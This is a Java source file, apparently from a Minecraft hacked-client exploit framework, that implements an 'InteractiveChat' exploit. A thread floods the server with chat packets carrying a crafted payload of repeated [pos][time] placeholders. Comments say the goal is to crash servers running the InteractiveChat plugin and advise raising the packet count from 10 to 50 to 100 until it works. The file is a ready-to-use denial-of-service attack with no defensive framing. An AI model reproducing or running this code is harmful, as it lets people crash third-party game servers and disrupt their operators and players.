package wtf.norma.nekito.exploit.impl.other;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.exploit.argument.Argument;
import wtf.norma.nekito.helper.ChatHelper;

@ExploitInfo(
        name = "interactivechat",
        type = ExploitType.OTHER,
        description = "InteractiveChat exploit"
)
public class InteractiveChatExploit extends Exploit {

    public InteractiveChatExploit() {
        super(new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        int packets = (int) args[0];
        ChatHelper.printMessage("Sending InteractiveChat exploit!");
        //You gotta test how many packets you have so send, because it depends on the server. Try starting with 10, sending these couple of times.
        //If that doesn't work then send 50 couple times. If that's not enough, send 100 couple of times.
        //For this exploit to work the server you want to crash needs to have the plugin InteractiveChat installed!!!
        (new Thread(() -> {
                for (int i = 0; i < packets; i++) {
                    Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("[pos]<chat=2eb10939-d3a4-4355-a906-dd49649aacbf:[time]:>[pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time]"));
                }
        })).start();
        ChatHelper.printMessage("Exploit finished!");
    }
}
